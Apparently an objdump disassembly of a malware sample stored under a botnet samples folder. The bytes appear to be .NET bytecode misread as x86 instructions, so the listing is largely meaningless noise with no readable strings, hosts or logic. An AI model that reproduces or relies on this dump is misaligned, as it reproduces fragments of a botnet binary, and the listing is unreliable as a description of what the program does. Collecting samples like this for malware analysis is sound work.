
malware_samples/botnet/1424940ec6af15c735a6a67737d7c7c5851a905c2e98f06646d6564b9bf55d34.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	d0 c6                	rol    $1,%dh
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 f4 59 00    	add    %al,0x59f400
  402013:	00 a0 6c 00 00 03    	add    %ah,0x300006c(%eax)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	40                   	inc    %eax
  4021d0:	25 00 70 7e 10       	and    $0x107e7000,%eax
  4021d5:	00 00                	add    %al,(%eax)
  4021d7:	04 28                	add    $0x28,%al
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 f4 20 00       	and    $0x20f472,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 ec                	jb     0x4021e2
  4021f6:	25 00 70 6f 8c       	and    $0x8c6f7000,%eax
  4021fb:	00 00                	add    %al,(%eax)
  4021fd:	06                   	push   %es
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 f4 20 00       	and    $0x20f472,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 fe                	jb     0x402224
  402226:	25 00 70 6f 8c       	and    $0x8c6f7000,%eax
  40222b:	00 00                	add    %al,(%eax)
  40222d:	06                   	push   %es
  40222e:	25 72 fe 25 00       	and    $0x25fe72,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 ee             	add    %dh,-0x12(%edx)
  4024e4:	20 00                	and    %al,(%eax)
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
  4025e6:	7a 03                	jp     0x4025eb
  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
